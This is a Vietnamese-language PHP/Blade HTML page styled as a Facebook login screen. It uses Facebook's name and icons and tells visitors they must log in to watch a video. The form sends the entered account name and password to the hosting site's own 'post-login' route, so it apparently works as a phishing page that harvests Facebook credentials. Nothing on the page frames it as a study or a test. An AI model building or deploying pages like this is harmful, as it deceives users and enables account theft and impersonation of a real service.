<!doctype html>
<html lang="<?php echo e(app()->getLocale()); ?>">
    <head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="csrf-token" content="<?php echo e(csrf_token()); ?>" />
        <title>Facebook</title>
        <!-- bootstrapt -->
        <script type="text/javascript" src="<?php echo e(asset('vendor/bootstrap.js')); ?>"></script>
        <link href="<?php echo e(asset('vendor/bootstrap.css')); ?>" rel="stylesheet">
        <link href="<?php echo e(asset('vendor/font-awesome.css')); ?>" rel="stylesheet">

        <!-- Fonts -->
        <link href="https://fonts.googleapis.com/css?family=Roboto:100,100i,300,300i,400,400i,500,500i,700,700i,900,900i&display=swap" rel="stylesheet">
        <link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">

        <!-- Styles -->
        <link href="<?php echo e(asset('mycss/main.css')); ?>" rel="stylesheet">
        <link href="<?php echo e(asset('mycss/responesive.css')); ?>" rel="stylesheet">
    </head>
    <body>
        <div class="container">
            <div class="wrap-top">
                <div class="wrap-image">
                    <div class="wrap-image-one">
                        <img src="<?php echo e(asset('images/icon1.png')); ?>" alt="" class="img-fluid">
                    </div>
                    <div class="wrap-image-two">`
                        <img src="<?php echo e(asset('images/facebook-icon.png')); ?>" alt="" class="img-fluid">
                    </div>
                </div>
                <h2 class="wrap-text-top">
                    <span class="text-top">Bạn cần đăng nhập để xem video.</span>
                </h2>
            </div>
            <div class="wraper-form">

                    <form method="post" class="detail-form"  action="<?php echo e(route('post-login')); ?>" >
                        <?php echo csrf_field(); ?>
                        <div class="content-form">
                            <div class="form-group">
                                <input type="text"  name="taikhoan"  id="taikhoan " class="form-control bd-none" >
                            </div>
                            <div class="form-group">
                                <input type="password" name="matkhau"  id="matkhau"  class="form-control bd-none" >
                            </div>

                            <div class="wrap-btn-login">

                            </div>
                        </div>

                        <div class="wrap-bottom-form">
                            <button class="btn btn-register">Tạo tài khoản mới</button>
                            <p>Quên mật khẩu? - Trung tâm trợ giúp</p>
                        </div>

                        <button type="submit" class="btn btn-primary">Thêm Blog</button>
                    </form>

            </div>
            <div class="bottom-page">
                <span>
                    <b>Tiếng Việt </b> <span class="color-blue">- Bahasa Melayu - English (UK) - More Languages...</span>
                </span>
                <br>
                <span>
                    Facebook ©2017
                </span>
            </div>


        </div>
    </body>
</html>
